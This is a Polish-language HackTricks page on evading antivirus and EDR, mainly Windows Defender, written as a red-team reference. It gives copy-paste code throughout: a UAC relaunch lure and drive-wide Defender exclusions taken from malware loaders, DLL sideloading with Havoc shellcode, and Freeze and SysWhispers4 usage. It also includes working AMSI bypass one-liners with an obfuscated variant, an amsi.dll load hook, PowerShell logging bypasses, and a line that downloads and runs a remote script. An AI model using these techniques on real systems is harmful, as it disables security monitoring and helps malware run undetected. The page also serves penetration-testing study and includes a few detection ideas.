# Ominięcie programu antywirusowego (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie zatrzymujące działanie Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące działanie Windows Defender poprzez podszywanie się pod inny program antywirusowy.
- [Wyłączenie Defendera, jeśli jesteś administratorem](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod cheaty do gier są często dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Schemat jest prosty:

1. Sprawdzenie kontekstu administracyjnego za pomocą `net session`. Polecenie kończy się powodzeniem tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako standardowy użytkownik.
2. Natychmiastowe ponowne uruchomienie samego siebie z użyciem czasownika `RunAs`, aby wywołać oczekiwany monit zgody UAC przy jednoczesnym zachowaniu oryginalnego wiersza poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc monit jest zwykle akceptowany, dając malware uprawnienia potrzebne do zmiany polityki Defendera.

### Wykluczenia `MpPreference` obejmujące każdą literę dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoader maksymalizują ślepe punkty Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija watchdog GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, przez co każdy profil użytkownika, katalog systemowy i dysk wymienny staje się niemożliwy do przeskanowania:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony w dowolnym miejscu na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest przygotowane na przyszłość — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownego modyfikowania Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal raportują „antywirus aktywny”, mimo że inspekcja w czasie rzeczywistym nigdy nie obejmuje tych ścieżek.

## **AV Evasion Methodology**

Obecnie AV używają różnych metod sprawdzania, czy plik jest złośliwy: static detection, dynamic analysis, a w przypadku bardziej zaawansowanych EDR-ów także behavioural analysis.

### **Static detection**

Static detection polega na wykrywaniu znanych złośliwych ciągów lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itd.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju detekcji:

- **Encryption**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić niektóre ciągi w pliku binarnym lub skrypcie, aby ominąć AV, ale może to być czasochłonne, zależnie od tego, co próbujesz obfuskować.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będą istniały znane sygnatury wskazujące na złośliwe działanie, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie działania static detection w Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie zasadniczo dzieli plik na wiele segmentów, a następnie zleca Defenderowi przeskanowanie każdego z nich osobno. Dzięki temu może dokładnie wskazać, które ciągi lub bajty w pliku binarnym zostały oznaczone.

Zdecydowanie polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) na temat praktycznego AV Evasion.

### **Dynamic analysis**

Dynamic analysis ma miejsce, gdy AV uruchamia plik binarny w sandboxie i obserwuje złośliwą aktywność (np. próbę odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS itd.). Ta część może być nieco trudniejsza, ale oto kilka sposobów na omijanie sandboxów.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na ominięcie dynamic analysis AV. AV mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie opóźnienia mogą utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć opóźnienie, zależnie od sposobu jego implementacji.
- **Checking machine's resources** Sandboxy zazwyczaj mają do dyspozycji bardzo mało zasobów (np. < 2 GB RAM), ponieważ w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę procesora lub nawet prędkość wentylatorów — nie wszystko zostanie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z określoną wartością. Jeśli wartości się nie zgadzają, możesz zakończyć działanie programu.

Okazuje się, że computername komputera używanego przez Microsoft Defender's Sandbox to HAL9TH, więc przed detonacją możesz sprawdzić nazwę komputera w malware. Jeśli nazwa to HAL9TH, oznacza to, że znajdujesz się w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących omijania sandboxów

<figure><img src="../images/image (248).png" alt=""><figcaption><p>kanał #malware-dev na <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a></p></figcaption></figure>

Jak wspomnieliśmy wcześniej w tym artykule, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz wykonać dump LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również wykonuje dump LSASS?

Prawdopodobnie właściwą odpowiedzią jest ta druga opcja. Biorąc mimikatz jako przykład, jest to prawdopodobnie jeden z — jeśli nie najbardziej — wykrywanych przez AV i EDR fragmentów malware. Sam projekt jest świetny, ale praca z nim w celu ominięcia AV to koszmar, więc po prostu szukaj alternatyw dla tego, co próbujesz osiągnąć.

> [!TIP]
> Podczas modyfikowania payloadów w celu evasion pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze i, proszę, naprawdę, **NIE PRZESYŁAJ ICH DO VIRUSTOTAL**, jeśli twoim długoterminowym celem jest uzyskanie evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz zadowalający wynik.

## EXEs vs DLLs

Gdy tylko jest to możliwe, zawsze **priorytetyzuj używanie DLLs w celu evasion**. Z mojego doświadczenia wynika, że pliki DLL są zazwyczaj **znacznie rzadziej wykrywane** i analizowane, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie detekcji (oczywiście jeśli twój payload może działać jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma współczynnik wykrywania 4/26 w antiscan.me, podczas gdy payload EXE ma współczynnik wykrywania 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me zwykłego payloadu Havoc EXE ze zwykłym Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka trików, których możesz użyć z plikami DLL, aby działać znacznie bardziej stealthily.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając aplikację ofiary i złośliwy payload (lub payloady) obok siebie.

Programy podatne na DLL Sideloading możesz wyszukiwać za pomocą [Siofra](https://github.com/Cybereason/siofra) oraz poniższego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ta komenda wyświetli listę programów podatnych na DLL hijacking w katalogu "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Zdecydowanie zalecam, abyś samodzielnie **zbadał programy DLL Hijackable/Sideloadable**. Ta technika, odpowiednio zastosowana, jest dość stealthy, ale jeśli użyjesz publicznie znanych programów DLL Sideloadable, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwego pliku DLL o nazwie oczekiwanej przez program nie spowoduje załadowania Twojego payloadu, ponieważ program oczekuje obecności określonych funkcji w tym pliku DLL. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania wykonywane przez program z proxy (i złośliwego) pliku DLL do oryginalnego pliku DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając obsługę wykonania Twojego payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną bibliotekę DLL ze zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Można uznać to za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Zdecydowanie polecam** obejrzeć [VOD z twitcha S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) dotyczący DLL Sideloading, a także [film ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omawianych przez nas zagadnieniach.

### Nadużywanie Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości „forwarderami”: zamiast wskazywać kod, wpis eksportu zawiera string ASCII w formacie `TargetDll.TargetFunc`. Gdy caller rozwiązuje eksport, Windows loader:

- Załaduje `TargetDll`, jeśli nie jest jeszcze załadowany
- Rozwiąże z niego `TargetFunc`

Najważniejsze zachowania, które należy zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, zostanie dostarczony z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, zostanie użyta normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego forward resolution.

Umożliwia to zastosowanie pośredniego sideloadingu: należy znaleźć podpisaną DLL eksportującą funkcję przekierowaną do modułu o nazwie niebędącej KnownDLL, a następnie umieścić tę podpisaną DLL razem z kontrolowaną przez atakującego DLL o nazwie dokładnie takiej samej jak nazwa przekierowywanego modułu. Gdy forwarded export zostanie wywołany, loader rozwiąże forward i załaduje Twoją DLL z tego samego katalogu, wykonując jej `DllMain`.

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwana zgodnie ze standardową kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z możliwością zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy do uzyskania wykonania kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Uruchom przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wcześniejszym wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na forwarded exports, w przypadku których docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły dotyczące wykrywania/ochrony:
- Monitoruj LOLBins (np. `rundll32.exe`) ładujące podpisane biblioteki DLL ze ścieżek niesystemowych, a następnie ładujące z tego katalogu biblioteki non-KnownDLLs o tej samej nazwie bazowej
- Generuj alerty dla łańcuchów proces/moduł, takich jak: `rundll32.exe` → niesystemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i blokuj uprawnienia write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w sposób zapewniający skryte działanie.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — coś, co działa dzisiaj, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-y często umieszczają **user-mode inline hooks** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować **direct** lub **indirect syscall stubs**, które załadują właściwy **SSN** (System Service Number) i wykonają przejście do kernel mode bez wykonywania zahookowanego export entrypoint.

**Opcje wywołania:**
- **Direct (embedded)**: umieszcza instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez trafienia w export `ntdll`).
- **Indirect**: wykonuje skok do istniejącego **syscall gadget** wewnątrz `ntdll`, dzięki czemu przejście do kernela wygląda tak, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadget z puli dla każdego wywołania.
- **Egg-hunt**: unika umieszczania statycznej sekwencji opcode `0F 05` na dysku; wyszukuje sekwencję syscall w runtime.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (VA sort)**: wnioskuje SSN, sortując stuby syscall według adresu wirtualnego zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: mapuje czysty `\KnownDlls\ntdll.dll`, odczytuje SSN z jego `.text`, a następnie go odmapowuje (omija wszystkie hooki znajdujące się w pamięci).
- **RecycledGate**: łączy wnioskowanie SSN na podstawie sortowania VA z walidacją opcode, gdy stub jest czysty; jeśli jest zahookowany, przełącza się na wnioskowanie na podstawie VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w runtime, bez analizowania zahookanych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został utworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo rozwiązania AV potrafiły skanować wyłącznie **pliki na dysku**, więc jeśli udało się jakoś wykonać payloady **bezpośrednio w pamięci**, AV nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami systemu Windows.

- User Account Control, czyli UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Pozwala rozwiązaniom antywirusowym analizować zachowanie skryptów poprzez udostępnianie zawartości skryptów w formie zarówno niezaszyfrowanej, jak i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że dodaje prefiks `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci przez AMSI.

Ponadto, począwszy od **.NET 4.8**, kod C# jest również przekazywany do AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do ładowania kodu wykonywanego w pamięci. Dlatego do wykonywania kodu w pamięci zaleca się używanie niższych wersji .NET (takich jak 4.7.2 lub niższych), jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie detekcji statycznych, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie detekcji.

AMSI ma jednak możliwość deobfuskowania skryptów, nawet jeśli zawierają one wiele warstw, więc obfuscation może być złą opcją w zależności od sposobu jej zastosowania. Sprawia to, że ominięcie detekcji nie jest proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych i problem znika, więc zależy to od tego, jak bardzo dany element został oflagowany.

- **AMSI Bypass**

Ponieważ AMSI jest implementowany poprzez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo ingerować w jego działanie, nawet działając jako użytkownik bez uprzywilejowanych uprawnień. Z powodu tej wady implementacji AMSI badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) spowoduje, że dla bieżącego procesu nie zostanie uruchomione skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu wykorzystaniu tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Ta linia została oczywiście wykryta przez samo AMSI, dlatego konieczna jest jej modyfikacja, aby można było użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka bypass jest umieszczenie user-mode hook na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie są wykonywane żadne skany.

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notatki
- Działa w PowerShell, WScript/CScript oraz niestandardowych loaderach (we wszystkim, co w przeciwnym razie załadowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów wiersza poleceń.
- Stosowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt do ominięcia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do ominięcia AMSI, który unika sygnatur dzięki losowym, zdefiniowanym przez użytkownika funkcjom, zmiennym i wyrażeniom znakowym oraz stosuje losową wielkość liter w słowach kluczowych PowerShell, aby uniknąć wykrycia przez sygnaturę.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj wersji 2 Powershell**
Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz zrobić to tak:
```bash
powershell.exe -version 2
```
## Logowanie PS

Logowanie PowerShell to funkcja umożliwiająca rejestrowanie wszystkich poleceń PowerShell wykonywanych w systemie. Może być przydatna do celów audytowych i rozwiązywania problemów, ale może również stanowić **problem dla attackerów, którzy chcą uniknąć wykrycia**.

Aby ominąć logowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz transkrypcję PowerShell i logowanie modułów**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell version 2**: Jeśli używasz PowerShell version 2, AMSI nie zostanie załadowane, dzięki czemu możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić za pomocą: `powershell.exe -version 2`
- **Użyj Unmanaged PowerShell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić powershell bez zabezpieczeń (tego właśnie używa `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia jego wykrywanie przez AV i EDR. Zachowaj ostrożność i być może stosuj szyfrowanie tylko do określonych sekcji kodu, które zawierają dane wrażliwe lub muszą zostać ukryte.

### Deobfuskacja plików binarnych .NET chronionych przez ConfuserEx

Podczas analizowania malware wykorzystującego ConfuserEx 2 (lub komercyjne forki) często można napotkać kilka warstw ochrony, które blokują dekompilatory i sandboxy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.

1.  Usunięcie ochrony przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je wewnątrz statycznego konstruktora (`<Module>.cctor`) modułu. Modyfikuje również sumę kontrolną PE, więc każda zmiana spowoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czyste assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Dane wyjściowe zawierają 6 parametrów ochrony przed modyfikacją (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne podczas tworzenia własnego unpackera.

2.  Odzyskiwanie symboli / control-flow – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybiera profil ConfuserEx 2
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe tekstowe.

3.  Usuwanie proxy calls – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć standardowe .NET API, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji wrapperów (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Malware często przechowuje go jako tablicę bajtów zakodowaną w TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

